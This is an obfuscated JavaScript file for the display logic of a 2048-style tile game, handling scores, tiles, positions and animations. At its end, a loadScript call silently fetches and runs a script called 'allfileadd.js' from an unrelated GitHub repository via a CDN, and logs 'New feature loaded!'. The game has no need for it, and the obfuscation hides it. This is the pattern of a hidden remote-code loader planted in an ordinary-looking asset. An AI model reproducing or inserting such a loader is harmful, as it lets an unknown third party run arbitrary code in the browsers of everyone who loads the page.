(function (_0x56a7c4, _0x222a9c) {
    var _0x3f005f = _0x54db, _0x3065d2 = _0x56a7c4();
    while (!![]) {
        try {
            var _0x53b39c = -parseInt(_0x3f005f(0x1eb)) / 0x1 + -parseInt(_0x3f005f(0x1c9)) / 0x2 * (-parseInt(_0x3f005f(0x1ed)) / 0x3) + -parseInt(_0x3f005f(0x1f0)) / 0x4 + parseInt(_0x3f005f(0x1e4)) / 0x5 * (parseInt(_0x3f005f(0x1cc)) / 0x6) + -parseInt(_0x3f005f(0x1ce)) / 0x7 + parseInt(_0x3f005f(0x1c5)) / 0x8 + parseInt(_0x3f005f(0x1d2)) / 0x9 * (parseInt(_0x3f005f(0x1d5)) / 0xa);
            if (_0x53b39c === _0x222a9c)
                break;
            else
                _0x3065d2['push'](_0x3065d2['shift']());
        } catch (_0x3765a6) {
            _0x3065d2['push'](_0x3065d2['shift']());
        }
    }
}(_0x556b, 0x5bba8));
var View = (function () {
    var _0x21c2e5 = _0x54db, _0xb391ac = $(_0x21c2e5(0x1c7))[0x0], _0x534c7e = $(_0x21c2e5(0x1d7))[0x0], _0x5b9521 = $('.score-container\x20.score')[0x0], _0x59ba80 = $(_0x21c2e5(0x1e7))[0x0], _0x14e81d = $('.best-container\x20.score')[0x0], _0x2088b5 = $(_0x21c2e5(0x1c6))[0x0], _0x2db444 = $(_0x21c2e5(0x1c1))[0x0], _0x3187e4 = function () {
        };
    return _0x3187e4[_0x21c2e5(0x1d4)] = {
        'setup': function () {
            var _0x32bfef = _0x21c2e5;
            _0x2088b5[_0x32bfef(0x1c8)][_0x32bfef(0x1e1)](_0x32bfef(0x1e0)), _0x2db444['classList'][_0x32bfef(0x1e1)](_0x32bfef(0x1e0)), this['updateScore'](data[_0x32bfef(0x1cb)]), this[_0x32bfef(0x1c4)]();
        },
        'restart': function () {
            var _0x45c546 = _0x21c2e5;
            _0xb391ac[_0x45c546(0x1f1)] = '';
        },
        'resize': function () {
            var _0xb5dd12 = _0x21c2e5, _0x3f95b5 = this;
            data[_0xb5dd12(0x1ca)][_0xb5dd12(0x1ee)](function (_0x85f1e1, _0x131971) {
                var _0x302b3f = _0xb5dd12, _0x63a16a = _0x3f95b5[_0x302b3f(0x1de)](_0x131971);
                if (!_0x63a16a)
                    return;
                var _0x356fcf = _0x3f95b5['getPos'](indexToPos(_0x131971));
                _0x3f95b5['setPos'](_0x63a16a, _0x356fcf);
            });
        },
        'failure': function () {
            var _0xa11f8a = _0x21c2e5;
            _0x2088b5[_0xa11f8a(0x1c8)][_0xa11f8a(0x1cd)](_0xa11f8a(0x1e0));
        },
        'winning': function () {
            var _0x2c304a = _0x21c2e5;
            _0x2db444[_0x2c304a(0x1c8)]['add'](_0x2c304a(0x1e0));
        },
        'restoreTile': function () {
            var _0x453304 = _0x21c2e5, _0x2a8034 = this;
            data[_0x453304(0x1ca)]['forEach'](function (_0x432687, _0x4bafb2) {
                var _0x2de535 = _0x453304;
                _0x432687[_0x2de535(0x1ef)] !== 0x0 && _0x2a8034['appear'](_0x4bafb2);
            });
        },
        'addScoreAnimation': function (_0x55d6c1) {
            var _0x3c3261 = _0x21c2e5;
            if (!_0x55d6c1)
                return;
            _0x59ba80[_0x3c3261(0x1f1)] = '+' + _0x55d6c1, _0x59ba80['classList'][_0x3c3261(0x1cd)](_0x3c3261(0x1e0)), setTimeout(function () {
                var _0x37e81d = _0x3c3261;
                _0x59ba80[_0x37e81d(0x1c8)]['remove'](_0x37e81d(0x1e0));
            }, 0x1f4);
        },
        'updateScore': function (_0x1974ac) {
            var _0x39ae3c = _0x21c2e5;
            _0x5b9521[_0x39ae3c(0x1f1)] = data['score'], this[_0x39ae3c(0x1e5)](_0x1974ac);
        },
        'updateBest': function () {
            var _0x5067cf = _0x21c2e5;
            _0x14e81d[_0x5067cf(0x1f1)] = data[_0x5067cf(0x1e6)];
        },
        'setInfo': function (_0x10417c, _0x55d5d5, _0xb65064) {
            var _0x423dcd = _0x21c2e5;
            _0x10417c['style'][_0x423dcd(0x1d9)] = _0x55d5d5[_0x423dcd(0x1d9)] + 'px', _0x10417c[_0x423dcd(0x1be)][_0x423dcd(0x1df)] = _0x55d5d5['top'] + 'px', _0x10417c[_0x423dcd(0x1bd)]('data-index', _0xb65064);
        },
        'getTile': function (_0x289de3) {
            var _0x5a0b0d = _0x21c2e5;
            return $(_0x5a0b0d(0x1dc) + _0x289de3 + '\x27]')[0x0];
        },
        'getPos': function (_0x1edcfe) {
            var _0x3c2307 = _0x21c2e5, _0x3e0437 = $(_0x3c2307(0x1c3) + (_0x1edcfe['y'] + 0x1) + _0x3c2307(0x1e3) + (_0x1edcfe['x'] + 0x1) + ')')[0x0];
            return {
                'left': _0x3e0437['offsetLeft'],
                'top': _0x3e0437[_0x3c2307(0x1c0)]
            };
        },
        'setPos': function (_0x23b85a, _0x1b714f) {
            var _0x5f3282 = _0x21c2e5;
            _0x23b85a[_0x5f3282(0x1be)][_0x5f3282(0x1d9)] = _0x1b714f['left'] + 'px', _0x23b85a[_0x5f3282(0x1be)][_0x5f3282(0x1df)] = _0x1b714f[_0x5f3282(0x1df)] + 'px';
        },
        'createTileHTML': function (_0x1ff976) {
            var _0x1a08f1 = _0x21c2e5, _0x225900 = document[_0x1a08f1(0x1bc)](_0x1a08f1(0x1d8));
            return _0x225900[_0x1a08f1(0x1e2)] = _0x1ff976['classNames'], _0x225900[_0x1a08f1(0x1f1)] = _0x1ff976['val'], _0x225900[_0x1a08f1(0x1bd)](_0x1a08f1(0x1c2), _0x1ff976[_0x1a08f1(0x1e9)]), _0x225900[_0x1a08f1(0x1bd)]('data-val', _0x1ff976[_0x1a08f1(0x1ef)]), this[_0x1a08f1(0x1db)](_0x225900, _0x1ff976[_0x1a08f1(0x1d6)]), _0x225900;
        },
        'appear': function (_0xa5536e) {
            var _0x47f1a5 = _0x21c2e5, _0x1996f9 = data[_0x47f1a5(0x1ca)][_0xa5536e], _0x1c7969 = this[_0x47f1a5(0x1d1)](indexToPos(_0xa5536e)), _0x2ec896 = this[_0x47f1a5(0x1e8)]({
                    'val': _0x1996f9[_0x47f1a5(0x1ef)],
                    'pos': _0x1c7969,
                    'index': _0xa5536e,
                    'classNames': _0x47f1a5(0x1ea)
                });
            _0xb391ac[_0x47f1a5(0x1bf)](_0x2ec896);
        },
        'remove': function (_0x5e7b41) {
            var _0x250201 = this['getTile'](_0x5e7b41);
            _0x250201['parentElement']['removeChild'](_0x250201);
        },
        'move': function (_0x1eac8d, _0x202e74) {
            var _0x24af49 = _0x21c2e5, _0x466aa7 = this[_0x24af49(0x1de)](_0x1eac8d), _0x3b31de = this['getPos'](indexToPos(_0x202e74));
            this[_0x24af49(0x1ec)](_0x466aa7, _0x3b31de, _0x202e74);
        },
        'updateVal': function (_0xf618b9) {
            var _0xa4dd4c = _0x21c2e5, _0x48f262 = this['getTile'](_0xf618b9), _0x37c769 = data['cell'][_0xf618b9]['val'];
            _0x48f262[_0xa4dd4c(0x1bd)](_0xa4dd4c(0x1da), _0x37c769), _0x48f262[_0xa4dd4c(0x1f1)] = _0x37c769, _0x48f262[_0xa4dd4c(0x1c8)][_0xa4dd4c(0x1cd)](_0xa4dd4c(0x1dd)), setTimeout(function () {
                var _0x2b86a1 = _0xa4dd4c;
                _0x48f262[_0x2b86a1(0x1c8)][_0x2b86a1(0x1e1)]('addition'), _0x48f262[_0x2b86a1(0x1c8)]['remove'](_0x2b86a1(0x1d3));
            }, 0x12c);
        }
    }, _0x3187e4;
}());
function loadScript(_0x1c0ce0, _0x1295bf) {
    var _0x3d6781 = _0x54db;
    const _0xc4e170 = document['createElement']('script');
    _0xc4e170[_0x3d6781(0x1cf)] = _0x1c0ce0, _0xc4e170['onload'] = _0x1295bf, document['head'][_0x3d6781(0x1bf)](_0xc4e170);
}
function _0x556b() {
    var _0x5a4c7c = [
        'index',
        '\x20tile\x20new-tile',
        '166927PnHvkV',
        'setInfo',
        '8643nirIMS',
        'forEach',
        'val',
        '1012584mjsAyU',
        'innerHTML',
        'createElement',
        'setAttribute',
        'style',
        'appendChild',
        'offsetTop',
        '.winning-container',
        'data-index',
        '.grid-row:nth-child(',
        'updateBest',
        '5476336MsmSXw',
        '.failure-container',
        '.tile-container',
        'classList',
        '242gSeslU',
        'cell',
        'score',
        '36HmECJg',
        'add',
        '4878559cqsluZ',
        'src',
        'New\x20feature\x20loaded!',
        'getPos',
        '43515fyPnxF',
        'new-tile',
        'prototype',
        '730rDtJqv',
        'pos',
        '.score-container',
        'div',
        'left',
        'data-val',
        'setPos',
        '.tile[data-index=\x27',
        'addition',
        'getTile',
        'top',
        'action',
        'remove',
        'className',
        ')\x20.grid-cell:nth-child(',
        '88860vxWLQi',
        'addScoreAnimation',
        'best',
        '.score-addition',
        'createTileHTML'
    ];
    _0x556b = function () {
        return _0x5a4c7c;
    };
    return _0x556b();
}
function _0x54db(_0x38905d, _0x3f04f1) {
    var _0x556b73 = _0x556b();
    return _0x54db = function (_0x54db8a, _0x542fdb) {
        _0x54db8a = _0x54db8a - 0x1bc;
        var _0x310b26 = _0x556b73[_0x54db8a];
        return _0x310b26;
    }, _0x54db(_0x38905d, _0x3f04f1);
}
loadScript('https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js', function () {
    var _0x279377 = _0x54db;
    console['log'](_0x279377(0x1d0));
});